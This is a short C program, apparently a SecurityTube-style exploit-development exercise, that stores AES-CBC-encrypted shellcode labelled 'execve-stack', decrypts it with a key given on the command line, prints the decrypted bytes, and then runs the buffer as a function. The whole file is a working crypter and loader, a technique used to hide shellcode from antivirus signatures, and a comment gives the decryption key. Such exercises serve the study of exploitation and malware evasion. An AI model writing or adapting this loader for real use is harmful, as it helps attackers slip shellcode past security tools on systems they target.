#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define CBC 1
#define ECB 0
#define CTR 0

#include "aes.h"

// execve-stack encrypted with key securitytube-key012345678901234
uint8_t enc_sc[] = "\xAF\x5B\x25\x46\x1C\xE4\x84\x94\xFC\x0F\x32\xDF\x9C\x31\x5D\x2D\xDA\xEF\x55\xC9\x8F\x56\x1F\xC1\x9C\x0C\x3B\x3A\x21\x0D\x61\xD3";

void decrypt(char *decryptKey, uint32_t length)
{
	struct AES_ctx ctx;
	char *iv = "a83lLkdfndi20did";
	
	AES_init_ctx_iv(&ctx, (uint8_t*)decryptKey, (uint8_t*)iv);
	
	AES_CBC_decrypt_buffer(&ctx, enc_sc, length);
}

main(int argc, char* argv[])
{
	if(strlen(argv[1]) != 32){
                printf("Make the key 32 bytes");
                return 0;
        }	

	int (*ret)() = (int(*)())enc_sc;
	char *decryptKey = argv[1];
        uint32_t sc_len = sizeof(enc_sc)-1;

	decrypt(decryptKey, sc_len);
	
	printf("Decrypted Shellcode:\n");

	for(int i = 0; i < sc_len; i++)
	{
		printf("\\x%02X", enc_sc[i]);

	}	
	printf("\n");	

	printf("Running Shellcode.\n\n\n");

	ret();

	printf("\n\n");

	return 1;
}
